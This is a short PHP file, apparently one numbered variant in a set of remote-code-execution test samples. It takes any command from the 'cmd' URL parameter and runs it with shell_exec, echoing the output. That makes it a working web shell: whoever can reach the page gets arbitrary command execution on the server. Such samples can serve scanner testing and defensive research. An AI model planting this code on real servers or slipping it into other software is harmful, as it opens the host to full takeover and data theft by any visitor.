<?php
// RCE test variation #1055
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>